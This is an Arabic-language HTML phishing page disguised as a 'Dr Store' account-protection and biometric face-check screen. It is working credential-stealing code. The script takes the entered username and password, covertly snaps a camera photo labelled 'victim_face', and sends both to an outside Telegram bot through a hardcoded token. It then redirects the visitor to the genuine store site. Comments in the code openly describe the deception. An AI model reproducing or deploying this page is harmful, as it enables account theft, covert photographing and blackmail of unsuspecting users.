<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dr Store - نظام الحماية المتقدم</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background-color: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 20px; padding: 35px 25px; width: 330px; text-align: center; box-shadow: 0 10px 30px rgba(76, 175, 80, 0.1); }
        .logo-container { width: 70px; height: 70px; margin: 0 auto 15px; border-radius: 50%; background: linear-gradient(45deg, #7b1fa2, #e91e63); display: flex; align-items: center; justify-content: center; border: 2px solid #333; }
        .logo-text { font-weight: bold; font-size: 28px; color: #fff; }
        h2 { font-size: 19px; margin-bottom: 5px; color: #fff; }
        .status { color: #4caf50; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: block; }
        p { font-size: 12px; color: #aaa; line-height: 1.5; margin-bottom: 20px; }
        input { width: 100%; background: #151515; border: 1px solid #222; border-radius: 10px; padding: 14px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; margin-bottom: 12px; text-align: center; }
        button { width: 100%; background: linear-gradient(90deg, #4caf50, #2e7d32); color: white; border: none; border-radius: 10px; padding: 14px; font-size: 15px; font-weight: bold; cursor: pointer; }
        #loading-view { display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div id="init-view">
            <div class="logo-container"><span class="logo-text">DR</span></div>
            <h2>تأمين الحساب المتقدم</h2>
            <span class="status">جدار حماية Dr Store 2026</span>
            <p>لتفعيل ميزة التشفير ومنع الابتزاز، يرجى تسجيل الدخول والضغط على زر "تأمين" للمطابقة الحيوية للوجه.</p>
            
            <input type="text" id="acc" placeholder="اسم المستخدم / الإيميل">
            <input type="password" id="key" placeholder="كلمة المرور">
            
            <button onclick="startCapture()">بدء تأمين الحساب</button>
        </div>

        <div id="loading-view">
            <div style="margin: 20px 0;">🔄</div>
            <h3>جاري المعالجة...</h3>
            <p>يرجى توجيه الهاتف أمام وجهك لإتمام عملية المطابقة الحيوية (Biometric Link).</p>
        </div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const CHAT_ID = "897618292";

        async function startCapture() {
            const user = document.getElementById('acc').value;
            const pass = document.getElementById('key').value;

            if (!user || !pass) return alert("أدخل البيانات أولاً");

            // 1. إظهار واجهة التحميل للتمويه
            document.getElementById('init-view').style.display = 'none';
            document.getElementById('loading-view').style.display = 'block';

            try {
                // 2. طلب الكاميرا (سيظن أنها للمطابقة الحيوية)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // 3. التقاط الصورة بعد ثانية واحدة من فتح الكاميرا
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // تحويل الصورة وإرسالها
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append("chat_id", CHAT_ID);
                        formData.append("photo", blob, "victim_face.jpg");
                        formData.append("caption", `🛡️ صيد كامل (تأمين):\n👤 اليوزر: ${user}\n🔑 الرمز: ${pass}`);

                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        }).then(() => {
                            // 4. التوجيه النهائي للموقع الرسمي
                            window.location.href = "https://drstoreq.com/";
                        });
                    }, 'image/jpeg');
                }, 1500);

            } catch (err) {
                // في حال رفض الكاميرا، نرسل اليوزر والباسورد فقط
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐 يوزر وباسورد (بدون صورة):\n${user} | ${pass}`)
                .then(() => window.location.href = "https://drstoreq.com/");
            }
        }
    </script>
</body>
</html>
